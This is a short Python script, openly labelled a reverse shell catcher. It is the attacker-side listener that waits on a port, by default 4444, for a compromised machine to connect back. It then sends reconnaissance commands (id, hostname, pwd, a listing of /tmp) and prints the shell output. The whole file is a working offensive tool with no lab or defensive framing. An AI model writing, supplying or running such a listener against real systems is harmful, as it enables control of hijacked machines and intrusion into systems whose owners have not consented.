"""One-shot reverse shell catcher — captures shell output for one command."""
import socket, sys, time

port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', port))
s.listen(1)
s.settimeout(15)
print(f'[*] Listening on port {port}...')
try:
    conn, addr = s.accept()
    print(f'[+] Connection from {addr[0]}:{addr[1]}')
    conn.sendall(b'id; hostname; pwd; ls -la /tmp\n')
    time.sleep(2)
    data = b''
    while True:
        try:
            chunk = conn.recv(4096)
            if not chunk: break
            data += chunk
        except: break
    print('[+] Shell output:')
    print(data.decode('utf-8', errors='replace'))
    conn.close()
except socket.timeout:
    print('[-] Timeout — no connection received')
finally:
    s.close()
